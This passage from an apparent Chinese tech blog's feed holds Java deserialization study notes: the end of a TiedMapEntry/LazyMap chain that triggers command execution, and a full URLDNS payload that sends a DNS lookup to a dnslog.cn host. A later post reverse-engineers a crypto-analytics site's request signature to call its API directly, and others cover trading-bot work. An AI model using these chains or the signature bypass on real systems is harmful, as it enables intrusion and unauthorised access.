&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// ===================== 步骤3：核心修复：用 TiedMapEntry 间接触发 LazyMap.get =====================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// TiedMapEntry 的 hashCode/equals 方法会调用 LazyMap.get，绕过 HashSet.map 类型限制&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;TiedMapEntry entry &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; TiedMapEntry(lazyMap, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;testKey&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// ===================== 步骤4：构造 HashSet 并绑定 TiedMapEntry =====================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HashSet hashSet &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; HashSet();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 向 HashSet 添加 TiedMapEntry（反序列化时会调用 entry 的 hashCode 触发 get）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashSet.&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(entry);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// 移除 entry 确保反序列化时重新计算 hashCode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lazyMap.&lt;span style=&#34;color:#a6e22e&#34;&gt;remove&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;testKey&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// ===================== 步骤5：序列化恶意对象 =====================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ByteArrayOutputStream bos &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ByteArrayOutputStream();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ObjectOutputStream oos &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ObjectOutputStream(bos);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        oos.&lt;span style=&#34;color:#a6e22e&#34;&gt;writeObject&lt;/span&gt;(hashSet);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        oos.&lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// ===================== 步骤6：反序列化触发漏洞 =====================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ByteArrayInputStream bis &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ByteArrayInputStream(bos.&lt;span style=&#34;color:#a6e22e&#34;&gt;toByteArray&lt;/span&gt;());
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ObjectInputStream ois &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ObjectInputStream(bis);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ois.&lt;span style=&#34;color:#a6e22e&#34;&gt;readObject&lt;/span&gt;(); &lt;span style=&#34;color:#75715e&#34;&gt;// 触发命令执行&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ois.&lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>JavaSec URLDNS</title>
        <link>https://byebydoggy.github.io/post/2025/javasec-urldns/</link>
        <pubDate>Thu, 20 Nov 2025 16:09:09 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/javasec-urldns/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post JavaSec URLDNS" /&gt;&lt;h1 id=&#34;什么是反序列化&#34;&gt;什么是反序列化
&lt;/h1&gt;&lt;p&gt;序列化指的是把类实例化的对象转化成字节流或者字符串，便于传输&lt;/p&gt;
&lt;p&gt;对于Java序列化的类需要实现Serializable接口&lt;/p&gt;
&lt;p&gt;反序列化即将字节流与字符串重新转化回对象&lt;/p&gt;
&lt;p&gt;反序列化时调用&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ObjectInputStream ois = new ObjectInputStream(fis)) {

// 反序列化对象
Dog dog = (Dog) ois.readObject();
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;原理&#34;&gt;原理
&lt;/h1&gt;&lt;h2 id=&#34;入口点&#34;&gt;入口点：
&lt;/h2&gt;&lt;p&gt;java.util.HashMap.readObject&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;putVal(hash(key), key, value, false, false);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中hash方法调用了键对象的hashCode方法&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &amp;gt;&amp;gt;&amp;gt; 16);
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;利用链&#34;&gt;利用链
&lt;/h2&gt;&lt;p&gt;先看java.net.URL类，URL重写了hashCode方法&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;hashCode是私有属性，防止重复调用，首次实例化对象时默认为-1，因此会调用handler.hashCode方法&lt;/p&gt;
&lt;p&gt;该方法中getHostAddress尝试获取url的IP地址&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;InetAddress addr = getHostAddress(u);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最终在InetAddress中实例化域名对象时触发DNS查询&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if (addrs == null) {
    // create a NameServiceAddresses instance which will look up
    // the name service and install it within cache...
Addresses oldAddrs = cache.putIfAbsent(
        host,
            addrs = new NameServiceAddresses(host)
    );
    if (oldAddrs != null) { // lost putIfAbsent race
addrs = oldAddrs;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;payload&#34;&gt;Payload
&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.FileInputStream;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.FileOutputStream;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.ObjectInputStream;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.ObjectOutputStream;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.lang.reflect.Field;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.net.URL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.text.SimpleDateFormat;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.Date;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.HashMap;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;URLDemo&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args) &lt;span style=&#34;color:#66d9ef&#34;&gt;throws&lt;/span&gt; Exception {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Date nowTime &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Date();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        HashMap hashmap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; HashMap();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        URL url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; URL(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://lttx9f.dnslog.cn&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        SimpleDateFormat simpleDateFormat &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; SimpleDateFormat(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;yyyy-MM-dd hh:mm:ss&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Field filed &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Class.&lt;span style=&#34;color:#a6e22e&#34;&gt;forName&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;java.net.URL&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;getDeclaredField&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hashCode&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        filed.&lt;span style=&#34;color:#a6e22e&#34;&gt;setAccessible&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);  &lt;span style=&#34;color:#75715e&#34;&gt;// 绕过Java语言权限控制检查的权限&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        filed.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(url, 209);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hashmap.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(url, 209);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        System.&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;当前时间为: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; simpleDateFormat.&lt;span style=&#34;color:#a6e22e&#34;&gt;format&lt;/span&gt;(nowTime));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        filed.&lt;span style=&#34;color:#a6e22e&#34;&gt;set&lt;/span&gt;(url, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;1);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            FileOutputStream fileOutputStream &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; FileOutputStream(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./dnsser&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ObjectOutputStream objectOutputStream &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ObjectOutputStream(fileOutputStream);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            objectOutputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;writeObject&lt;/span&gt;(hashmap);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            objectOutputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            fileOutputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            FileInputStream fileInputStream &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; FileInputStream(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./dnsser&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ObjectInputStream objectInputStream &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ObjectInputStream(fileInputStream);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            objectInputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;readObject&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            objectInputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            fileInputStream.&lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception e) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            e.&lt;span style=&#34;color:#a6e22e&#34;&gt;printStackTrace&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;踩坑&#34;&gt;踩坑
&lt;/h1&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;filed.setAccessible(true);  // 绕过Java语言权限控制检查的权限
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;访问私有属性在Java9以上需要额外参数，于是我想构建时使用JAVA8&lt;/p&gt;
&lt;p&gt;若使用了高版本特性编写了JAVA代码，构建时再使用JAVA8会报错java: 警告: 源发行版 18 需要目标发行版 18，建议直接以JAVA8重新启个项目，不然我也不知道哪个是新特性啊。&lt;/p&gt;
&lt;h1 id=&#34;参考文献&#34;&gt;参考文献
&lt;/h1&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/articles/web/327710.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Java安全学习—URLDNS链 - FreeBuf网络安全行业门户&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Hummingbot内存泄露Bug排查</title>
        <link>https://byebydoggy.github.io/post/2025/hummingbot%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2bug%E6%8E%92%E6%9F%A5/</link>
        <pubDate>Wed, 19 Nov 2025 22:19:38 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/hummingbot%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2bug%E6%8E%92%E6%9F%A5/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post Hummingbot内存泄露Bug排查" /&gt;&lt;h1 id=&#34;起因&#34;&gt;起因
&lt;/h1&gt;&lt;p&gt;发现运行OKX_perpetual连接器时，hummingbot每隔一小时内存会增长100MB。（为此错失了几年一次的&lt;del&gt;抄底&lt;/del&gt;爆仓机会）&lt;/p&gt;
&lt;h1 id=&#34;排查&#34;&gt;排查
&lt;/h1&gt;&lt;p&gt;跟随GPT指引，先使用了pyrasite-shell hook全部hummingbot模块中的对象内存占用，每隔一段时间定时快照，并比较快照不同。  然而几分钟之后pyrasite就与hummingbot进程解除绑定了，不知道什么原因，多次尝试也不行。&lt;/p&gt;
&lt;p&gt;后来改下启动程序，在开头单独启动一个内存对象监听的进程。定位到json/decoder每隔10分钟增长大概30MB，以及okx_perpetual_order_book模块中同步的内存增长。 发现mark_price,index_price频道均订阅但无消费者，导致队列无限增长，项目组的大坑今天才算填上，难道没人用okx_perpetual吗？&lt;/p&gt;
&lt;h1 id=&#34;后续工作&#34;&gt;后续工作
&lt;/h1&gt;&lt;p&gt;1.基于Hummingbot Connector和Python MT5将MT5集成到Hummingbot以实现加密货币与最大的外汇市场统一策略编写。&lt;/p&gt;
&lt;p&gt;2.修改Hummingbot的回测框架，以支持秒级TimeFrame和从本地文件流式传输数据。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>ARKM前端逆向</title>
        <link>https://byebydoggy.github.io/post/2025/arkm%E5%89%8D%E7%AB%AF%E9%80%86%E5%90%91/</link>
        <pubDate>Tue, 18 Nov 2025 11:15:05 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/arkm%E5%89%8D%E7%AB%AF%E9%80%86%E5%90%91/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post ARKM前端逆向" /&gt;&lt;h1 id=&#34;arkm平台前端逆向&#34;&gt;ARKM平台前端逆向
&lt;/h1&gt;&lt;p&gt;1.随便找个包，发现headers中携带X-Payload参数，堆栈点一点，找到加密位置&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.imgur.la/images/2025/11/18/097f21372cda45b9b04bfe4364917d8b.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;097f21372cda45b9b04bfe4364917d8b&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;2.控制台打印获取a.ClientKey&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.imgur.la/images/2025/11/18/05785df35119761a009ecdcdac63c768.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;05785df35119761a009ecdcdac63c768&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;3.Python编写加密函数&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-python-repl&#34; data-lang=&#34;python-repl&#34;&gt;import requests
import time
import hashlib
import json
query = &amp;#34;bybit&amp;#34;
salt = &amp;#34;gh67j345kl&amp;#34;
def make_payload(path: str, ts: str) -&amp;gt; str:
    &amp;#34;&amp;#34;&amp;#34;复现 JS 里的两段 sha256 逻辑&amp;#34;&amp;#34;&amp;#34;
    step1 = hashlib.sha256(f&amp;#34;{path}:{ts}:{salt}&amp;#34;.encode()).hexdigest()
    return hashlib.sha256(f&amp;#34;{salt}:{step1}&amp;#34;.encode()).hexdigest()

path = &amp;#34;/transfers&amp;#34;
ts = str(int(time.time()))
payload = make_payload(path, ts)
# 1. 构造与浏览器一致的请求头
headers = {
    &amp;#34;accept&amp;#34;: &amp;#34;application/json, text/plain, */*&amp;#34;,
    &amp;#34;accept-encoding&amp;#34;: &amp;#34;gzip, deflate, br, zstd&amp;#34;,
    &amp;#34;accept-language&amp;#34;: &amp;#34;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&amp;#34;,
    &amp;#34;origin&amp;#34;: &amp;#34;https://intel.arkm.com&amp;#34;,
    &amp;#34;referer&amp;#34;: &amp;#34;https://intel.arkm.com/&amp;#34;,
    &amp;#34;sec-ch-ua&amp;#34;: &amp;#39;&amp;#34;Chromium&amp;#34;;v=&amp;#34;142&amp;#34;, &amp;#34;Microsoft Edge&amp;#34;;v=&amp;#34;142&amp;#34;, &amp;#34;Not_A Brand&amp;#34;;v=&amp;#34;99&amp;#34;&amp;#39;,
    &amp;#34;sec-ch-ua-mobile&amp;#34;: &amp;#34;?0&amp;#34;,
    &amp;#34;sec-ch-ua-platform&amp;#34;: &amp;#39;&amp;#34;Windows&amp;#34;&amp;#39;,
    &amp;#34;sec-fetch-dest&amp;#34;: &amp;#34;empty&amp;#34;,
    &amp;#34;sec-fetch-mode&amp;#34;: &amp;#34;cors&amp;#34;,
    &amp;#34;sec-fetch-site&amp;#34;: &amp;#34;same-site&amp;#34;,
    &amp;#34;user-agent&amp;#34;: &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 &amp;#34;
                  &amp;#34;(KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36 Edg/142.0.0.0&amp;#34;,
    &amp;#34;x-timestamp&amp;#34;: ts,
    &amp;#34;x-payload&amp;#34;: payload,
        &amp;#34;cookie&amp;#34;: &amp;#34;_ga=GA1.1.1952893755.1763016182; _fbp=fb.1.1763016181936.907337779104231599; _clck=1erlme0%5E2%5Eg0z%5E0%5E2143; mp_db580d24fbe794a9a4765D&amp;#34;
}

# 3. 发起请求
url = f&amp;#34;https://api.arkm.com{path}&amp;#34;
resp = requests.get(url, headers=headers, timeout=10)
print(json.dumps(resp.json(), ensure_ascii=False, indent=2))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4.获取完整的项目方关联地址，参与到后续区块扫描流程&lt;/p&gt;
</description>
        </item>
        <item>
        <title>交易框架|MarketDataCollector</title>
        <link>https://byebydoggy.github.io/post/2025/%E4%BA%A4%E6%98%93%E6%A1%86%E6%9E%B6marketdatacollector/</link>
        <pubDate>Tue, 18 Nov 2025 01:40:11 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/%E4%BA%A4%E6%98%93%E6%A1%86%E6%9E%B6marketdatacollector/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post 交易框架|MarketDataCollector" /&gt;&lt;h1 id=&#34;介绍&#34;&gt;介绍
&lt;/h1&gt;&lt;p&gt;使用coingecko及CMC定时采集主流交易所及链上项目合约地址，对于不同链不同交易所的相同币种使用coin_id作为唯一键进行定位，允许使用name,symbol,exchange,address进行索引。 用于整体交易流程中的代币查询流程。&lt;/p&gt;
&lt;h1 id=&#34;代办&#34;&gt;代办
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;优化查询操作&lt;/li&gt;
&lt;li&gt;优化存储结构，降低内存占用&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>交易框架 Hummingbot</title>
        <link>https://byebydoggy.github.io/post/2025/%E4%BA%A4%E6%98%93%E6%A1%86%E6%9E%B6hummingbot/</link>
        <pubDate>Tue, 18 Nov 2025 01:27:19 +0800</pubDate>
        
        <guid>https://byebydoggy.github.io/post/2025/%E4%BA%A4%E6%98%93%E6%A1%86%E6%9E%B6hummingbot/</guid>
        <description>&lt;img src="https://byebydoggy.github.io/cover.png" alt="Featured image of post 交易框架 Hummingbot" /&gt;&lt;h1 id=&#34;部分优化&#34;&gt;部分优化
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;原项目在同一connector中添加多个symbol时，因Candles对象属于Clock对象，在生命周期每个tick每个Candles会向服务器发起health check，导致并发而被服务器限速，修改这部分问题。&lt;/li&gt;
&lt;li&gt;对于全部执行器均适配合约交易&lt;/li&gt;
&lt;li&gt;原项目完全基于tick进行策略触发，最短tick为1s，在ScriptStrategy基类基础上修改以支持事件驱动触发&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;待办&#34;&gt;待办
&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;回测框架支持自定义策略，以及更短的时间框架（1s）&lt;/li&gt;
&lt;li&gt;支持从Tardis获取远期历史数据&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;附录&#34;&gt;附录
&lt;/h1&gt;&lt;p&gt;原项目地址: &lt;a class=&#34;link&#34; href=&#34;https://github.com/hummingbot/hummingbot&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;github&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>区块链扫描工具EVM-Trackooor</title>
        <link>https://byebydoggy.github.io/post/2025/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%B7%A5%E5%85%B7evm-trackooor/</link>
        <pubDate>Mon, 17 Nov 2025 22:31:54 +0800</pubDate>
        
